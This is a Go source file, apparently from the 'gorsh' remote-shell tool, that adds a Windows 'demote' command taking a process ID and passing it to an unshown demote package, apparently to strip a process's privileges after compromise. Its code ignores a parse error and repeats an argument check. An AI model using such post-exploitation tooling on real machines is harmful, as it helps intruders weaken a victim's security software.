//go:build windows

package cmds

import (
	"strconv"

	"github.com/abiosoft/ishell"
	"github.com/audibleblink/gorsh/internal/demote"
)

func Demote(c *ishell.Context) {
	if len(c.Args) != 1 {
		c.Println(c.Cmd.Help)
		return
	}

	pidS := c.Args[0]
	pid, err := strconv.Atoi(pidS)
	if len(c.Args) != 1 {
		c.Println(c.Cmd.Help)
		return
	}
	err = demote.Demote(pid)
	if err != nil {
		c.Printf("failed to demote pid %d: %s\n", pid, err)
		return
	}
	c.Printf("successfully demoted %d\n", pid)
}
